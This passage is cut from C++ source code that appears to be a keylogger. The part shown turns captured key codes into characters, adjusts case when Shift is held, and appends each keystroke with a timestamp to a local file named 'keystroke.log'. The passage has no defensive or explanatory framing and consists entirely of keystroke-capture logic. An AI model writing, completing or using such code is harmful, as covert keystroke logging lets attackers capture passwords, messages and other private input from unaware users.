                if (modifiers & MOD_SHIFT) {
                    c = static_cast<char>(n ^ 0x20); // Shift
                }
                // Append to log file
                ofstream logfile("keystroke.log", ios::app);
                logfile << time << " " << c << endl;
                logfile.close();
            } else {
                // Log the key as is
                char c = static_cast<char>(n);
                ofstream logfile("keystroke.log", ios::app);
                logfile << time << " " << c << endl;
                logfile.close();
            }
        }
    }
}

